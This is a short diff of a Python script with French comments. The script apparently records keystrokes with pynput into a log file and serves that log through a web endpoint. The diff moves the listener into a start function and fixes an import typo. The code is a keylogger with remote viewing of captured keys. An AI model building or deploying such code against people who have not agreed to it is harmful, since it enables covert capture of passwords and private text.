@@ -40,11 +40,10 @@ def on_press(key):
 
 
 # Démarre l'écoute des frappes
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+
 
 def start_keyboard_listener():
-    from pynput import keyboar
+    from pynput import keyboard
 
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
@@ -81,4 +80,3 @@ def read_logs():
         return {"error": "log.txt introuvable", "path": LOG_FILE}, 404
     with open(LOG_FILE, "r", encoding="utf-8") as f:
         return "<pre>" + f.read() + "</pre>", 200
-
